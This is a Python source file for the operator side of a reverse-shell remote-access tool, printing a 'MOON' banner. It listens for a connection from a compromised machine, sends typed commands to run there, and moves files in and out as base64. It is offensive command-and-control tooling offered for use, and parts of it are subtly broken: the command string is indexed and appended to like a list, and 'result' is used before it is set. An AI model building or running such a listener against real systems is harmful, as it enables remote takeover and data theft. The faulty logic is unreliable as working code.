import socket
import json
import base64
import subprocess


class Listener:
    def __init__(self, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.port = port
        self.host_name = socket.gethostname()

        listener.bind(("localhost", self.port))
        listener.listen(4)

        server_about = {
            "HostName": self.host_name,
            "Port": self.port
        }

        print("[+] Server info")
        for key in server_about:
            print(f"{key} <-> {server_about[key]}")

        print("\n[+] Waiting for incoming connection")
        self.connection, self.address = listener.accept()
        print(f"[+] Got a connection -> from :: {str(self.address)}")

    def dataDecode(self, data) -> bytes:

        if type(data) is bytes:
            decode_data = data.decode("utf-8")
            return decode_data

        else:
            return data

    def dataEncode(self, data):

        if type(data) is not bytes:
            encode_data = data.encode("utf-8")
            return encode_data

        else:
            return data

    def reliable_send(self, data):
        json_data = json.dumps(data)
        json_data = self.dataEncode(json_data)
        self.connection.send(json_data)
        print(f"[+] rel send -> {data}")

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.dataDecode(json_data + self.connection.recv(1024))
                return json.loads(json_data)
                print(f"[+] rcv -> {json.loads(json_data)}")

            except ValueError:
                continue

    def execute_remotely(self, command):
        try:
            self.reliable_send(command)
            result = self.dataEncode(self.reliable_receive())
            result = self.dataDecode(result)
            return result

        except AttributeError:
            return "[-] AttributeError"

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, 'rb')as file:
            return base64.b64encode(file.read())

    def run(self):
        try:
            while True:
                command = str(input(">> "))

                try:
                    if command[0] == "download":
                        print(f"[+] Downloading file as {command[1]}")
                        result = self.write_file(command[1], result)

                    if command[0] == "upload" and "[-] Error" not in result:
                        file_content = self.read_file(command[1])
                        command.append(file_content)

                except Exception:
                    result = "[-] Error during comand execution ::Server::"
                    print(result)

                result = self.execute_remotely(command)
                print(f"\n[result]\n{result}\n[#####]\n")

        except KeyboardInterrupt:
            print("\n[-] Quiting")
            self.connection.close()
            exit()


if __name__ == "__main__":

    term: bool = True

    if term:
        subprocess.call("clear")
        tag = ["╔═╗╔═╗╔═══╗╔═══╗╔═╗─╔╗",
               "║║╚╝║║║╔═╗║║╔═╗║║║╚╗║║",
               "║╔╗╔╗║║║─║║║║─║║║╔╗╚╝║",
               "║║║║║║║║─║║║║─║║║║╚╗║║",
               "║║║║║║║╚═╝║║╚═╝║║║─║║║",
               "╚╝╚╝╚╝╚═══╝╚═══╝╚╝─╚═╝"]

        for i in tag:
            print(f"\t{i}")
        print("-"*42)

    port = 8080
    listener = Listener(port)
    listener.run()
